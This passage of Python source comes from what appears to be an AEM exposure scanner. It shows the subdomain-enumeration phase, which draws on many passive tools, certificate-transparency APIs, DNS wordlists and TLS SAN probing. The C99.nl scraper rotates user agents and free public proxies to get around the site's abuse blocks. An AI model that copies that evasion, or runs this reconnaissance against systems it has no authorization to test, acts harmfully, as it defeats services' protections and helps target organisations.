            if scan_id in db:
                del db[scan_id]
                tmp = DB_PATH + ".tmp"
                with open(tmp, "w") as f:
                    json.dump(db, f, separators=(",", ":"))
                os.replace(tmp, DB_PATH)
        except Exception as e:
            log.warning("Failed to delete persisted scan %s: %s", scan_id, e)


def _load_persisted_scans() -> None:
    """Load all scans from disk into the in-memory registry at startup."""
    if not os.path.exists(DB_PATH):
        return
    try:
        with open(DB_PATH, "r") as f:
            db: dict[str, Any] = json.load(f)
        loaded = 0
        for scan_id, d in db.items():
            try:
                scan = _dict_to_scan(d)
                # Mark any scan that was mid-flight when server died as interrupted
                if scan.status in ("running", "pending", "paused"):
                    scan.status = "interrupted"
                    scan.paused_reason = ""
                    if not scan.finished_at:
                        scan.finished_at = scan.started_at  # best we can do
                scans[scan_id] = scan
                loaded += 1
            except Exception as e:
                log.warning("Skipping corrupt scan record %s: %s", scan_id, e)
        log.info("Loaded %d persisted scans from %s", loaded, DB_PATH)
    except Exception as e:
        log.warning("Could not load scan DB: %s", e)


# ============================================================================
# WEBSOCKET MESSAGING
# ============================================================================
def _send_ws(scan: ScanState, msg: dict[str, Any]) -> None:
    """Queue a message for async WebSocket delivery and save to history."""
    # Save log messages to history for late WebSocket connections
    if msg.get("type") == "log":
        with scan._log_history_lock:
            scan._log_history.append(msg)
            # Cap at 2000 messages to prevent memory bloat
            if len(scan._log_history) > 2000:
                scan._log_history = scan._log_history[-1500:]
    if scan._loop and scan._msg_queue:
        try:
            scan._loop.call_soon_threadsafe(scan._msg_queue.put_nowait, msg)
        except Exception:
            pass


async def _ws_dispatcher(scan: ScanState) -> None:
    """Background task: drain the message queue and push to all WS clients."""
    while True:
        msg = await scan._msg_queue.get()
        if msg is None:
            break
        dead = []
        with scan.ws_lock:
            connections = list(scan.ws_connections)
        for ws in connections:
            try:
                await ws.send_json(msg)
            except Exception:
                dead.append(ws)
        if dead:
            with scan.ws_lock:
                for ws in dead:
                    if ws in scan.ws_connections:
                        scan.ws_connections.remove(ws)


# ============================================================================
# UTILITY
# ============================================================================
def normalize_url(url: str) -> str | None:
    url = url.strip().rstrip("/")
    if not url:
        return None
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    return url


def find_go_httpx() -> str | None:
    """Locate the ProjectDiscovery httpx binary."""
    candidates = [
        os.path.expanduser("~/.pdtm/go/bin/httpx"),
        os.path.expanduser("~/go/bin/httpx"),
        "/usr/local/bin/httpx",
        "/opt/homebrew/bin/httpx",
    ]

    def is_pd(p: str) -> bool:
        if not os.path.isfile(p):
            return False
        try:
            out = subprocess.run(
                [p, "-version"], capture_output=True, text=True, timeout=5
            )
            return "projectdiscovery" in (out.stdout + out.stderr).lower()
        except Exception:
            return False

    for p in candidates:
        if is_pd(p):
            return p
    try:
        for line in (
            subprocess.run(["which", "-a", "httpx"], capture_output=True, text=True)
            .stdout.strip()
            .split("\n")
        ):
            if line.strip() and is_pd(line.strip()):
                return line.strip()
    except Exception:
        pass
    return None


def is_waf_rejection(resp: requests.Response) -> bool:
    """Check if a 200 response is actually a WAF block page."""
    if len(resp.content) == 0:
        return False
    body_lower = resp.text.lower()
    return any(sig in body_lower for sig in WAF_REJECT_SIGS)


def get_soft404_baseline(base_url: str, timeout: int = DEFAULT_TIMEOUT) -> list[int]:
    """Probe random paths to detect catch-all servers. Returns baseline body sizes."""
    sizes = []
    for probe in SOFT404_PROBES:
        try:
            r = requests.get(
                base_url + probe,
                headers=HEADERS,
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )
            if r.status_code == 200:
                sizes.append(len(r.content))
        except Exception:
            pass
    return sizes if len(sizes) == len(SOFT404_PROBES) else []


def is_real_aem_response(
    resp: requests.Response, ep_label: str, soft404_sizes: list[int]
) -> bool:
    """Validate a 200 response is genuine AEM content, not a WAF page or soft-404."""
    # Layer 0: WAF rejection check
    if is_waf_rejection(resp):
        return False

    if not soft404_sizes:
        # Not a catch-all server — still check for AEM body signature
        sigs = AEM_SIGNATURES.get(ep_label)
        if sigs:
            body_lower = resp.text.lower()
            return any(sig.lower() in body_lower for sig in sigs)
        return True

    # Catch-all server: size must differ from baseline AND body must have AEM sig
    size = len(resp.content)
    for baseline in soft404_sizes:
        if abs(size - baseline) <= 200:
            return False

    sigs = AEM_SIGNATURES.get(ep_label)
    if sigs:
        body_lower = resp.text.lower()
        if not any(sig.lower() in body_lower for sig in sigs):
            return False

    return True


# ============================================================================
# PHASE 1: SUBDOMAIN ENUMERATION
# ============================================================================
def phase1_subdomains(scan: ScanState) -> None:
    """Run subfinder for subdomain enumeration."""
    _send_ws(scan, {
        "type": "phase",
        "phase": 1,
        "name": "Subdomain Enumeration",
        "status": "running",
    })
    scan.phase = ScanPhase.SUBDOMAIN

    if not scan.domain:
        _send_ws(scan, {
            "type": "phase",
            "phase": 1,
            "name": "Subdomain Enumeration",
            "status": "skipped",
            "message": "No domain provided, using direct URLs",
        })
        return

    log.info("Phase 1: Enumerating subdomains for %s", scan.domain)
    seen: set[str] = set()
    count = 0

    def _add_sub(sub: str, source: str = "") -> None:
        nonlocal count
        sub = sub.strip().lower().rstrip(".")
        if sub and sub not in seen and scan.domain in sub:
            seen.add(sub)
            count += 1
            scan.subdomains.append(sub)
            _send_ws(scan, {
                "type": "subdomain_found",
                "phase": 1,
                "subdomain": sub,
            })
            if count % 50 == 0:
                _send_ws(scan, {
                    "type": "progress",
                    "phase": 1,
                    "current": count,
                    "total": 0,
                    "message": f"Found {count} subdomains ({source})...",
                })

    # ── Helper: run a CLI tool and collect subdomains ──
    def _run_tool(cmd: list[str], tool_name: str, timeout_s: int = 180) -> None:
        try:
            _send_ws(scan, {"type": "log", "level": "info", "message": f"Running {tool_name} (max {timeout_s}s)..."})
            before = count
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL, text=True)

            # REAL timeout enforcement: kill process after timeout_s
            # The old code only called proc.wait(timeout=) AFTER stdout iteration,
            # which never fires if the process keeps its pipe open (amass on microsoft.com = 6hrs+)
            deadline = time.time() + timeout_s
            killed = False

            def _watchdog():
                nonlocal killed
                time.sleep(timeout_s)
                if proc.poll() is None:
                    killed = True
                    try:
                        proc.kill()
                    except Exception:
                        pass

            watcher = threading.Thread(target=_watchdog, daemon=True)
            watcher.start()

            for line in proc.stdout:
                if scan.cancelled:
                    proc.kill()
                    return
                if killed:
                    break
                _add_sub(line, tool_name)

            try:
                proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                proc.kill()
                proc.wait()

            added = count - before
            if killed:
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": f"{tool_name}: timed out after {timeout_s}s, collected +{added} (total: {count})"})
            else:
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": f"{tool_name}: +{added} new (total: {count})"})
        except FileNotFoundError:
            _send_ws(scan, {"type": "log", "level": "info", "message": f"{tool_name}: not installed, skipping"})
        except Exception as e:
            log.warning("%s error: %s", tool_name, e)

    # ── Helper: run an HTTP API and collect subdomains ──
    def _run_api(url: str, api_name: str, parse_fn: callable) -> None:
        if scan.cancelled:
            return
        try:
            _send_ws(scan, {"type": "log", "level": "info", "message": f"Querying {api_name}..."})
            before = count
            r = requests.get(url, timeout=30, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code == 200 and r.content:
                for sub in parse_fn(r):
                    _add_sub(sub, api_name)
            _send_ws(scan, {"type": "log", "level": "info", "message": f"{api_name}: +{count - before} new (total: {count})"})
        except Exception as e:
            _send_ws(scan, {"type": "log", "level": "info", "message": f"{api_name}: failed ({type(e).__name__})"})
            log.warning("%s error: %s", api_name, e)

    d = scan.domain

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 0: C99.nl Subdomain Finder (100K+ subdomains)
    # This is the single most comprehensive free subdomain source.
    # For microsoft.com it returns 100,000 subdomains — 20x more than
    # all other sources combined. Runs FIRST so subsequent sources
    # only add what C99 missed.
    #
    # Mode A (preferred): Official C99 JSON API — set C99_API_KEY env var.
    #   export C99_API_KEY=your_key_here   ($5 at https://api.c99.nl)
    #   No scraping, no abuse detection, no IP blocks.
    #
    # Mode B (fallback): HTML scraping with proxy + UA rotation.
    #   Set C99_PROXIES=http://ip:port,socks5://ip:port,...  to rotate IPs.
    #   If no proxies set, tries plain scraping (may hit abuse block).
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        import re as _re_c99
        from datetime import date as _date, timedelta as _td

        c99_before = count
        c99_success = False

        # ── Mode A: Official JSON API ──────────────────────────────────
        if C99_API_KEY and not scan.cancelled:
            try:
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": f"C99.nl: using API key (official API)..."})
                log.info("SOURCE 0: C99.nl API mode for %s", d)
                api_url = f"https://api.c99.nl/subdomainfinder?key={C99_API_KEY}&domain={d}&json"
                proxy = _next_c99_proxy()
                api_resp = requests.get(
                    api_url, timeout=60,
                    headers={"User-Agent": _next_c99_ua(), "Accept": "application/json"},
                    proxies=proxy,
                )
                if api_resp.status_code == 200:
                    try:
                        api_data = api_resp.json()
                        # API returns {"success": true, "subdomains": [...], ...}
                        subdomain_list = api_data.get("subdomains", [])
                        if isinstance(subdomain_list, list):
                            for entry in subdomain_list:
                                # each entry may be a string or {"subdomain": "...", "ip": "..."}
                                if isinstance(entry, str):
                                    _add_sub(entry, "c99-api")
                                elif isinstance(entry, dict):
                                    sub = entry.get("subdomain", "")
                                    if sub:
                                        _add_sub(sub, "c99-api")
                            c99_added = count - c99_before
                            _send_ws(scan, {"type": "log", "level": "info",
                                            "message": f"C99.nl API: +{c99_added} subdomains (total: {count})"})
                            log.info("SOURCE 0: C99.nl API done, +%d subdomains", c99_added)
                            c99_success = True
                        else:
                            # Unexpected format — log raw snippet
                            snippet = api_resp.text[:200]
                            _send_ws(scan, {"type": "log", "level": "warn",
                                            "message": f"C99.nl API: unexpected response format: {snippet}"})
                    except ValueError:
                        snippet = api_resp.text[:300]
                        _send_ws(scan, {"type": "log", "level": "warn",
                                        "message": f"C99.nl API: non-JSON response: {snippet}"})
                elif api_resp.status_code == 401 or "invalid" in api_resp.text.lower():
                    _send_ws(scan, {"type": "log", "level": "warn",
                                    "message": "C99.nl API: invalid API key — falling back to scraping"})
                else:
                    _send_ws(scan, {"type": "log", "level": "warn",
                                    "message": f"C99.nl API: HTTP {api_resp.status_code} — falling back to scraping"})
            except Exception as e:
                _send_ws(scan, {"type": "log", "level": "warn",
                                "message": f"C99.nl API error: {type(e).__name__}: {e} — falling back to scraping"})
                log.warning("C99.nl API error: %s", e)

        # ── Mode B: HTML scraper with proxy + UA rotation ──────────────
        # Auto-fetches fresh free proxies if none are configured and an
        # abuse block is detected — no manual setup needed.
        if not c99_success and not scan.cancelled:
            try:
                proxy_info = (f" via {len(C99_PROXY_LIST)} proxies" if C99_PROXY_LIST
                              else " (auto-proxy enabled — will fetch proxies if blocked)")
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": f"C99.nl: scraping last 30 days{proxy_info}..."})
                log.info("SOURCE 0: C99.nl scrape mode for %s (proxies: %d)", d, len(C99_PROXY_LIST))
                c99_found = False
                abuse_blocks = 0          # count consecutive blocks before auto-fetch
                _auto_fetched = False     # only auto-fetch once per scan

                pattern = _re_c99.compile(
                    r"'([a-zA-Z0-9][a-zA-Z0-9._-]*\." + _re_c99.escape(d) + r")'"
                )

                for days_back in range(30):
                    if scan.cancelled:
                        break
                    check_date = (_date.today() - _td(days=days_back)).strftime("%Y-%m-%d")
                    c99_url = f"https://subdomainfinder.c99.nl/scans/{check_date}/{d}"

                    # Pick next proxy and UA from rotation pools
                    proxy = _next_c99_proxy()
                    used_proxy_str = list(proxy.values())[0] if proxy else None
                    ua = _next_c99_ua()

                    try:
                        c99_resp = requests.get(
                            c99_url, timeout=30, stream=True,
                            headers={"User-Agent": ua, "Accept": "text/html,*/*",
                                     "Accept-Language": "en-US,en;q=0.9",
                                     "Referer": "https://subdomainfinder.c99.nl/"},
                            proxies=proxy,
                        )
                    except requests.RequestException as req_e:
                        p_label = used_proxy_str or "direct"
                        _send_ws(scan, {"type": "log", "level": "warn",
                                        "message": f"C99.nl: connection error via {p_label}: {req_e}"})
                        if used_proxy_str:
                            _remove_proxy(used_proxy_str)  # evict dead proxy
                        continue

                    # ── Abuse block detection ──────────────────────────────
                    body_preview = ""
                    is_abuse = False
                    if c99_resp.status_code == 403:
                        is_abuse = True
                    elif c99_resp.status_code == 200:
                        body_preview = c99_resp.text[:2000]
                        is_abuse = "abuse" in body_preview.lower() or "abuse@c99.nl" in body_preview.lower()

                    if is_abuse:
                        c99_resp.close()
                        abuse_blocks += 1
                        p_label = used_proxy_str or "direct IP"
                        _send_ws(scan, {"type": "log", "level": "warn",
                                        "message": f"C99.nl: ⚠ abuse block on {p_label} (block #{abuse_blocks}) — evicting & rotating..."})
                        log.warning("C99.nl abuse block #%d on %s", abuse_blocks, p_label)

                        # Evict the blocked proxy (it's now tainted)
                        if used_proxy_str:
                            _remove_proxy(used_proxy_str)

                        # If we've hit 2+ blocks and haven't auto-fetched yet → get fresh proxies
                        if abuse_blocks >= 2 and not _auto_fetched:
                            _auto_fetched = True
                            _send_ws(scan, {"type": "log", "level": "info",
                                            "message": "C99.nl: auto-fetching fresh free proxies (this takes ~15s)..."})

                            def _status_cb(msg: str) -> None:
                                _send_ws(scan, {"type": "log", "level": "info",
                                                "message": f"ProxyFetch: {msg}"})

                            fresh = fetch_fresh_proxies(min_working=10, status_cb=_status_cb)
                            if fresh:
                                with _c99_proxy_lock:
                                    # Merge fresh into existing list (existing may still have good ones)
                                    for p in fresh:
                                        if p not in C99_PROXY_LIST:
                                            C99_PROXY_LIST.append(p)
                                _send_ws(scan, {"type": "log", "level": "info",
                                                "message": f"C99.nl: loaded {len(fresh)} fresh proxies — resuming..."})
                            else:
                                _send_ws(scan, {"type": "log", "level": "warn",
                                                "message": "C99.nl: no working free proxies found — skipping C99 source"})
                                break  # give up on C99 entirely if no proxies work

                        continue  # try next date with fresh proxy

                    if c99_resp.status_code != 200:
                        c99_resp.close()
                        continue

                    # ── Stream and extract subdomains ──────────────────────
                    _send_ws(scan, {"type": "log", "level": "info",
                                    "message": f"C99.nl: streaming {check_date}" +
                                               (f" via {used_proxy_str}" if used_proxy_str else "") + "..."})

                    date_before = count
                    leftover = body_preview  # body_preview may already have content
                    for match in pattern.findall(leftover):
                        _add_sub(match, "c99")
                    leftover = leftover[-300:] if len(leftover) > 300 else leftover
                    chunk_count = 0
                    for chunk in c99_resp.iter_content(chunk_size=131072, decode_unicode=True):
                        if scan.cancelled:
                            break
                        if chunk:
                            text = leftover + chunk
                            for match in pattern.findall(text):
                                _add_sub(match, "c99")
                            leftover = text[-300:] if len(text) > 300 else ""
                            chunk_count += 1
                            if chunk_count % 5 == 0:
                                _send_ws(scan, {"type": "log", "level": "info",
                                                "message": f"C99.nl: streaming {check_date}... +{count - c99_before} new so far..."})
                    c99_resp.close()
                    date_added = count - date_before

                    if date_added > 0:
                        c99_added = count - c99_before
                        _send_ws(scan, {"type": "log", "level": "info",
                                        "message": f"C99.nl ({check_date}): +{c99_added} subdomains found (total: {count})"})
                        log.info("SOURCE 0: C99.nl scrape done, +%d new from %s", c99_added, check_date)
                        c99_found = True
                        break
                    else:
                        _send_ws(scan, {"type": "log", "level": "info",
                                        "message": f"C99.nl: {check_date} empty, trying older..."})
                        log.info("SOURCE 0: C99.nl %s empty for %s", check_date, d)

                if not c99_found and not scan.cancelled:
                    _send_ws(scan, {"type": "log", "level": "info",
                                    "message": f"C99.nl: no scan found in last 30 days for {d}"})
                    log.info("SOURCE 0: C99.nl — no scan in last 30 days for %s", d)
            except Exception as e:
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": f"C99.nl: failed ({type(e).__name__}: {e})"})
                log.warning("C99.nl error: %s", e)

    # ── Internet check before each tool — auto-pause if offline ──────────────
    def _net_ok(label: str) -> bool:
        """Return True if internet is up (blocks until back). False = cancelled."""
        return _wait_for_internet(scan, f"Phase 1 {label}")

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 1: subfinder (passive — 25+ sources)
    # ══════════════════════════════════════════════════════════════════
    if _net_ok("subfinder"):
        _run_tool(["subfinder", "-d", d, "-silent", "-all"], "subfinder")

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 2: assetfinder (passive — FB CT, certspotter, threatcrowd)
    # Often finds 10-15x more than subfinder alone
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled and _net_ok("assetfinder"):
        _run_tool(["assetfinder", "--subs-only", d], "assetfinder", timeout_s=60)

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 3: amass passive (60+ sources, ASN walking)
    # The most comprehensive passive tool — catches everything
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled and _net_ok("amass"):
        _run_tool(["amass", "enum", "-passive", "-norecursive", "-d", d], "amass", timeout_s=90)

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 4: crt.sh PAGINATED (Certificate Transparency logs)
    # Single query on large domains (microsoft.com) times out.
    # Solution: crawl page by page with &offset=N
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled and _net_ok("crt.sh"):
        try:
            _send_ws(scan, {"type": "log", "level": "info", "message": "Crawling crt.sh (Certificate Transparency) paginated..."})
            crt_before = count
            max_pages = 30   # 30 pages × ~100 certs = ~3000 certs (enough for most domains)
            empty_pages = 0
            for page in range(max_pages):
                if scan.cancelled or empty_pages >= 3:
                    break
                if not _net_ok(f"crt.sh page {page+1}"):
                    break  # cancelled
                offset = page * 100
                try:
                    r = requests.get(
                        f"https://crt.sh/?q=%.{d}&output=json&offset={offset}",
                        timeout=20,
                        headers={"User-Agent": "Mozilla/5.0"},
                    )
                    if r.status_code != 200 or not r.content or r.content == b"[]":
                        empty_pages += 1
                        continue
                    entries = r.json()
                    if not entries:
                        empty_pages += 1
                        continue
                    empty_pages = 0
                    for entry in entries:
                        for name in entry.get("name_value", "").split("\n"):
                            name = name.strip().lstrip("*.")
                            if name and name.endswith(d):
                                _add_sub(name, "crt.sh")
                    if page % 10 == 0 and page > 0:
                        _send_ws(scan, {"type": "log", "level": "info",
                                        "message": f"crt.sh: page {page}/{max_pages}, +{count - crt_before} new so far..."})
                except requests.exceptions.Timeout:
                    _send_ws(scan, {"type": "log", "level": "info", "message": f"crt.sh: page {page} timed out, continuing..."})
                    continue
                except Exception:
                    empty_pages += 1
                    continue
            _send_ws(scan, {"type": "log", "level": "info", "message": f"crt.sh: +{count - crt_before} new (total: {count})"})
        except Exception as e:
            log.warning("crt.sh paginated error: %s", e)

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 5: HackerTarget (free hostsearch API)
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        _run_api(
            f"https://api.hackertarget.com/hostsearch/?q={d}",
            "hackertarget",
            lambda r: [
                line.split(",")[0].strip()
                for line in r.text.strip().split("\n")
                if "," in line and line.split(",")[0].strip().endswith(d)
            ],
        )

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 6: RapidDNS (free subdomain search)
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        import re as _re
        _run_api(
            f"https://rapiddns.io/subdomain/{d}?full=1",
            "rapiddns",
            lambda r: list(set(_re.findall(r"([a-zA-Z0-9._-]+\." + _re.escape(d) + r")", r.text))),
        )

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 7: JLDC (free API)
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        _run_api(
            f"https://jldc.me/anubis/subdomains/{d}",
            "jldc-anubis",
            lambda r: [s for s in r.json() if s.endswith(d)] if isinstance(r.json(), list) else [],
        )

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 8: AlienVault OTX (threat intelligence)
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        _run_api(
            f"https://otx.alienvault.com/api/v1/indicators/domain/{d}/passive_dns",
            "alienvault-otx",
            lambda r: [
                e.get("hostname", "")
                for e in r.json().get("passive_dns", [])
                if e.get("hostname", "").endswith(d)
            ],
        )

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 9: TLS certificate scanning (tlsfinder if available)
    # Connects to IPs and reads SAN from TLS certs — catches things
    # like quantum.microsoft.com that have dedicated certs
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        tlsfinder = os.path.expanduser("~/.pdtm/go/bin/tlsfinder")
        if os.path.isfile(tlsfinder):
            _run_tool([tlsfinder, "-d", d, "-silent"], "tlsfinder", timeout_s=60)

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 10: DNS records (SPF, DMARC, MX → extract subdomains)
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        import re as _re
        try:
            _send_ws(scan, {"type": "log", "level": "info", "message": "Checking DNS records (SPF/DMARC/MX)..."})
            before = count
            for qtype in ["TXT", "MX", "NS", "CNAME"]:
                try:
                    result = subprocess.run(
                        ["dig", qtype, d, "+short"], capture_output=True, text=True, timeout=10
                    )
                    for sub in _re.findall(r"([a-zA-Z0-9._-]+\." + _re.escape(d) + r")", result.stdout):
                        _add_sub(sub, f"dns-{qtype}")
                except Exception:
                    pass
            # SPF record may reference include:sub.domain.com
            try:
                result = subprocess.run(
                    ["dig", "TXT", d, "+short"], capture_output=True, text=True, timeout=10
                )
                for spf_include in _re.findall(r"include:([a-zA-Z0-9._-]+)", result.stdout):
                    if spf_include.endswith(d):
                        _add_sub(spf_include, "spf-include")
            except Exception:
                pass
            _send_ws(scan, {"type": "log", "level": "info", "message": f"DNS records: +{count - before} new"})
        except Exception:
            pass

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 11: TLS SAN extraction with tlsx
    # After finding subdomains, connect to each and read the cert's
    # Subject Alternative Names. Certs often list OTHER subdomains
    # that weren't discovered by passive sources.
    # This is how quantum.microsoft.com gets found — it has its own
    # cert with SAN: quantum.microsoft.com
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled and scan.subdomains:
        tlsx_bin = os.path.expanduser("~/.pdtm/go/bin/tlsx")
        if os.path.isfile(tlsx_bin):
            try:
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": f"TLS SAN extraction: scanning {len(scan.subdomains)} hosts for cert SANs..."})
                tls_before = count
                tlsx_timeout = 90
                proc = subprocess.Popen(
                    [tlsx_bin, "-silent", "-san", "-cn", "-resp-only"],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    text=True,
                )

                # Watchdog to kill tlsx if it hangs
                tlsx_killed = False
                def _tlsx_watchdog():
                    nonlocal tlsx_killed
                    time.sleep(tlsx_timeout)
                    if proc.poll() is None:
                        tlsx_killed = True
                        try:
                            proc.kill()
                        except Exception:
                            pass
                tlsx_wd = threading.Thread(target=_tlsx_watchdog, daemon=True)
                tlsx_wd.start()

                # Cap at 500 hosts — each one requires a TLS handshake, 2000+ is too slow
                san_sample = scan.subdomains[:500]
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": f"TLS SAN: probing {len(san_sample)} hosts (max {tlsx_timeout}s)..."})
                proc.stdin.write("\n".join(san_sample))
                proc.stdin.close()
                for line in proc.stdout:
                    if scan.cancelled or tlsx_killed:
                        proc.kill()
                        break
                    line = line.strip().strip("[]")
                    for name in line.split(","):
                        name = name.strip()
                        if name and name.endswith(d):
                            _add_sub(name, "tls-san")
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait()
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": f"TLS SAN: +{count - tls_before} new (total: {count})"})
            except Exception as e:
                log.warning("tlsx SAN extraction error: %s", e)

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 12: CNAME pattern discovery
    # Check CNAME records of discovered subdomains. If multiple subs
    # point to the same CNAME target (e.g. adobe-aem.map.fastly.net),
    # search for MORE subs with that same CNAME pattern.
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled and scan.subdomains:
        dnsx_bin = os.path.expanduser("~/.pdtm/go/bin/dnsx")
        if not os.path.isfile(dnsx_bin):
            dnsx_bin = "/usr/local/bin/dnsx"
        if os.path.isfile(dnsx_bin):
            try:
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": "CNAME pattern analysis: resolving discovered subdomains..."})
                cname_before = count
                # Run dnsx to get CNAME records for a sample of discovered subdomains
                cname_timeout = 60
                sample = scan.subdomains[:300]
                proc = subprocess.Popen(
                    [dnsx_bin, "-silent", "-cname", "-resp-only"],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    text=True,
                )

                # Watchdog for dnsx
                dnsx_killed = False
                def _dnsx_watchdog():
                    nonlocal dnsx_killed
                    time.sleep(cname_timeout)
                    if proc.poll() is None:
                        dnsx_killed = True
                        try:
                            proc.kill()
                        except Exception:
                            pass
                dnsx_wd = threading.Thread(target=_dnsx_watchdog, daemon=True)
                dnsx_wd.start()

                proc.stdin.write("\n".join(sample))
                proc.stdin.close()
                cname_targets = set()
                for line in proc.stdout:
                    if dnsx_killed:
                        break
                    cname = line.strip().rstrip(".")
                    if cname:
                        cname_targets.add(cname)
                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait()

                # Log interesting CNAME patterns (AEM, CDN, cloud providers)
                aem_cnames = [c for c in cname_targets if any(
                    p in c.lower() for p in ["aem", "adobe", "akamai", "fastly", "cloudfront", "azure"]
                )]
                if aem_cnames:
                    _send_ws(scan, {"type": "log", "level": "info",
                                    "message": f"CNAME patterns: {', '.join(aem_cnames[:5])}"})

                _send_ws(scan, {"type": "log", "level": "info",
                                "message": f"CNAME analysis: {len(cname_targets)} unique targets found"})
            except Exception as e:
                log.warning("CNAME analysis error: %s", e)

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 13: DNS wordlist resolution (dnsx)
    # Passive APIs fail for massive domains (crt.sh 502, CertSpotter
    # pagination, URLScan limits). DNS resolution is the ONLY reliable
    # method — if a subdomain resolves, it exists. Period.
    # Uses a 679-word focused wordlist + dnsx to resolve in ~10 seconds.
    # This is how quantum.microsoft.com gets found — it resolves to
    # 151.101.107.10 (Fastly / AEM Cloud).
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        dnsx_bin = os.path.expanduser("~/.pdtm/go/bin/dnsx")
        if not os.path.isfile(dnsx_bin):
            dnsx_bin = "/usr/local/bin/dnsx"
        wordlist_path = os.path.join(os.path.dirname(__file__), "dns-wordlist.txt")
        if os.path.isfile(dnsx_bin) and os.path.isfile(wordlist_path):
            try:
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": "DNS wordlist resolution: probing common prefixes..."})
                log.info("SOURCE 13: Starting DNS wordlist resolution with dnsx")
                dns_before = count

                # Read wordlist and generate full domain names
                with open(wordlist_path) as wf:
                    prefixes = [line.strip() for line in wf if line.strip() and not line.startswith("#")]

                dns_timeout = 60
                proc = subprocess.Popen(
                    [dnsx_bin, "-silent"],
                    stdin=subprocess.PIPE,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.DEVNULL,
                    text=True,
                )

                # Watchdog to kill dnsx if it hangs
                dns_wl_killed = False
                def _dns_wl_watchdog():
                    nonlocal dns_wl_killed
                    time.sleep(dns_timeout)
                    if proc.poll() is None:
                        dns_wl_killed = True
                        try:
                            proc.kill()
                        except Exception:
                            pass
                dns_wl_wd = threading.Thread(target=_dns_wl_watchdog, daemon=True)
                dns_wl_wd.start()

                # Feed prefixed domains to dnsx
                domains_to_check = "\n".join(f"{p}.{d}" for p in prefixes)
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": f"DNS wordlist: resolving {len(prefixes)} prefixes (max {dns_timeout}s)..."})
                proc.stdin.write(domains_to_check)
                proc.stdin.close()

                for line in proc.stdout:
                    if scan.cancelled or dns_wl_killed:
                        proc.kill()
                        break
                    resolved = line.strip()
                    if resolved and resolved.endswith(d):
                        _add_sub(resolved, "dns-wordlist")

                try:
                    proc.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    proc.kill()
                    proc.wait()

                added = count - dns_before
                if dns_wl_killed:
                    _send_ws(scan, {"type": "log", "level": "info",
                                    "message": f"DNS wordlist: timed out after {dns_timeout}s, found +{added} (total: {count})"})
                else:
                    _send_ws(scan, {"type": "log", "level": "info",
                                    "message": f"DNS wordlist: +{added} new (total: {count})"})
                log.info("SOURCE 13: DNS wordlist done, +%d new subdomains", added)
            except FileNotFoundError:
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": "DNS wordlist: dnsx not found, skipping"})
            except Exception as e:
                log.warning("DNS wordlist error: %s", e)
        else:
            if not os.path.isfile(dnsx_bin):
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": "DNS wordlist: dnsx not installed, skipping"})
            if not os.path.isfile(wordlist_path):
                _send_ws(scan, {"type": "log", "level": "info",
                                "message": "DNS wordlist: wordlist file not found, skipping"})

    # ══════════════════════════════════════════════════════════════════
    # SOURCE 14: CertSpotter API (Certificate Transparency)
    # Independent from crt.sh — paginated to get deeper coverage.
    # Free tier: 100 certs/page. We fetch up to 10 pages = 1000 certs.
    # ══════════════════════════════════════════════════════════════════
    if not scan.cancelled:
        try:
            _send_ws(scan, {"type": "log", "level": "info",
                            "message": "Querying CertSpotter (Certificate Transparency)..."})
            cs_before = count
            cs_after = None
            cs_max_pages = 10
            for cs_page in range(cs_max_pages):
                if scan.cancelled:
                    break
                cs_url = (
                    f"https://api.certspotter.com/v1/issuances"
                    f"?domain={d}&include_subdomains=true&expand=dns_names"
                )
                if cs_after:
                    cs_url += f"&after={cs_after}"
                try:
                    r = requests.get(cs_url, timeout=20, headers={"User-Agent": "Mozilla/5.0"})
                    if r.status_code == 429:
